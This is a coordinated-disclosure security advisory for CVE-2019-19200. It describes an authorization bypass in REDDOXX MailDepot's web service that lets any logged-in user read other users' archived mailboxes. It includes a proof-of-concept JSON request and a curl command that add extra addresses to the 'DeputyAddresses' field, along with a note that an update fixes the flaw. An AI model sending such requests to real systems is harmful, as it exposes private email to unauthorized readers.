@@ -1,0 +1,108 @@
+id: 35017
+date: 10/01/2020
+title: MailDepot 2032 SP2 (2.2.1242) Authorization Bypass Vulnerability
+author: Micha Borrmann
+cves: CVE-2019-19200
+
+Product:                   MailDepot
+Manufacturer:              REDDOXX GmbH
+Affected Version(s):       2032 SP2 (2.2.1242)
+Tested Version(s):         2032 SP2 (2.2.1242)
+Vulnerability Type:        Improper Authorization (CWE-285)
+Risk Level:                High
+Solution Status:           Fixed
+Manufacturer Notification: 2019-11-19
+Solution Date:             2020-06-09
+Public Disclosure:         2020-10-02
+CVE Reference:             CVE-2019-19200
+Authors of Advisory:       Micha Borrmann (SySS GmbH)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Overview:
+
+REDDOXX MailDepot is  an e-mail archiving solution  with many features
+and an optional web browser user interface.
+
+The manufacturer describes the product as follows (see [1]):
+
+"The email  archiving solution  works independently  from the  type of
+mail server, supports any type of  storage and can therefore be easily
+integrated into any existing infrastructure."
+
+Due to improper user authorization checks, a user can access mailboxes
+of other users.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Vulnerability Details:
+
+The REDDOXX MailDepot web service  does not correctly verify whether a
+user  has  the  proper  rights  to access  specified  mailboxes  in  a
+corresponding web service request.
+
+The web service request will only  be processed if it contains a valid
+authentication token  (usual REST web  service), but the names  of the
+mailboxes to be  accessed are given within a JSON  object which is not
+validated properly regarding user access permissions.
+
+Thus, any authenticated  user can access mailboxes of  other users due
+to improper authorization checks.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Proof of Concept (PoC):
+
+After a successful logon, an ID is  assigned by the server to the user
+and this ID has  to be sent with every further  web service request as
+an authentication token (usual REST web service).
+
+In order  to access  a mailbox, a  request with a  JSON object  of the
+following type is sent:
+
+{
+  "id": "{12345678-1234-5678-1234-5678ABCD0000}",
+  "method": "MailDepot2.QueryMailDepot",
+  "params": {
+    "Query": {
+      "NewQuery": true,
+      "QueryString": "DATE:[20191114095729 TO 20191119095729]",
+      "Storages": [],
+      "Categories": [],
+      "States": [
+        "csManual"
+      ],
+      "DeputyAddresses": [
+        "validuser@company.com"
+      ],
+      "IncludeDeleted": false,
+      "MaxResults": 10000,
+      "MaxResponseTime": 30000,
+      "Page": 1,
+      "Rows": 30,
+      "SortField": "date",
+      "SortDirection": "desc"
+    }
+  }
+}
+
+By   adding  additional   values   (e-mail  addresses)   to  the   key
+"DeputyAddresses",  mailboxes of  other users  can be  accessed in  an
+unauthorized way.
+
+The following example using cURL demonstrates this attack:
+
+$ curl --url 'https://mailarchive.company.com/RdxEngine/json' --data '{"id":"{12345678-1234-5678-1234-5678ABCD0000}","method":"MailDepot2.QueryMailDepot","params":{"Query":{"NewQuery":true,"QueryString":"DATE:[20191114095729 TO 20191119095729]","Storages":[],"Categories":[],"States":["csManual"],"DeputyAddresses":["validuser@company.com","bigboss@company.com"],"IncludeDeleted":false,"MaxResults":10000,"MaxResponseTime":30000,"Page":1,"Rows":30,"SortField":"date","SortDirection":"desc"}}}'
+
+It  is more  convenient to  perform this  kind of  attack using  a web
+browser and a modifying web proxy.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Solution:
+
+Install the provided  security update.  If such a  modified request is
+sent,  the  updated  version  2033 (2.3.3022)  replies  with  "No  ACL
+assigned".
+
+#  0day.today [2023-03-23]  #
